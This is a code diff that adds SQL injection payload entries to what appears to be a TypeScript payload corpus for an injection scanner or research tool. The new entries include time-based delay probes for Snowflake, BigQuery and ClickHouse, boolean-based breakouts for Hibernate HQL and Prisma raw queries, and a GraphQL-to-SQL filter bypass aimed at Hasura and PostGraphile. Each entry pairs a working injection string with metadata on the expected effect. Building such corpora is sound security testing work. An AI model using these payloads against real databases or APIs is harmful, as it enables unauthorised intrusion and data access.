@@ -391,6 +391,86 @@ export class PayloadResearchCorpus {
       riskLevel: 'Probe',
       version: '2026.4',
     },
+
+    // ----------------------------------------------------
+    // 8. Cloud Data Warehouse & Columnar Analytical Probes
+    // ----------------------------------------------------
+    {
+      id: 'CDW_SF_001',
+      name: 'Snowflake SYSTEM$WAIT Execution Delay',
+      dbms: 'Snowflake',
+      context: 'single_quote_string',
+      technique: 'Time-based',
+      payload: "'||(SELECT SYSTEM$WAIT(3))||'",
+      expectedBehavior: 'Snowflake warehouse paused for 3000ms',
+      negativeBehavior: 'Immediate response or syntax error if non-Snowflake',
+      riskLevel: 'Probe',
+      version: '2026.4',
+    },
+    {
+      id: 'CDW_BQ_001',
+      name: 'BigQuery Unnest Computational Array Delay',
+      dbms: 'Google BigQuery',
+      context: 'single_quote_string',
+      technique: 'Time-based',
+      payload: "' AND (SELECT COUNT(*) FROM UNNEST(GENERATE_ARRAY(1, 3000000)))>0 AND '1'='1",
+      expectedBehavior: 'Observable computational processing delay in BigQuery execution engine',
+      negativeBehavior: 'Immediate response',
+      riskLevel: 'Probe',
+      version: '2026.4',
+    },
+    {
+      id: 'CDW_CH_001',
+      name: 'ClickHouse Columnar sleep() Probe',
+      dbms: 'ClickHouse',
+      context: 'single_quote_string',
+      technique: 'Time-based',
+      payload: "' AND sleep(3)=0 AND '1'='1",
+      expectedBehavior: 'ClickHouse query thread paused for 3 seconds',
+      negativeBehavior: 'Immediate response',
+      riskLevel: 'Probe',
+      version: '2026.4',
+    },
+
+    // ----------------------------------------------------
+    // 9. Modern ORM & Query Compiler AST Probes
+    // ----------------------------------------------------
+    {
+      id: 'ORM_HQL_001',
+      name: 'Hibernate HQL / JPQL Entity Subquery Differential',
+      dbms: 'Generic SQL',
+      context: 'where_clause',
+      technique: 'Boolean-based',
+      payload: "1=1 AND (SELECT count(e) FROM User e) IS NOT NULL",
+      expectedBehavior: 'Evaluates TRUE without breaking HQL entity mapping parser',
+      negativeBehavior: 'HQL AST parse error or entity resolution failure',
+      riskLevel: 'Safe',
+      version: '2026.4',
+    },
+    {
+      id: 'ORM_PRISMA_001',
+      name: 'Prisma Raw Query Parenthesis & Literal Breakout',
+      dbms: 'Generic SQL',
+      context: 'parenthesized_string',
+      technique: 'Boolean-based',
+      payload: "1') OR ('1'='1",
+      expectedBehavior: 'Balances surrounding parenthesized template expression in $queryRawUnsafe',
+      negativeBehavior: 'Mismatched parenthesis error',
+      riskLevel: 'Safe',
+      version: '2026.4',
+    },
+    {
+      id: 'GQL_AST_001',
+      name: 'GraphQL-to-SQL Compiler Filter Injection',
+      dbms: 'Generic SQL',
+      context: 'json_derived',
+      technique: 'Boolean-based',
+      payload: '{"_eq": "1", "_or": [{"1": {"_eq": "1"}}]}',
+      expectedBehavior: 'Bypasses compiled boolean filter AST in Hasura/PostGraphile query compiler',
+      negativeBehavior: 'GraphQL schema validation error on unknown field',
+      riskLevel: 'Safe',
+      version: '2026.4',
+    },
   ];
 
   public static getPayloads(options?: {
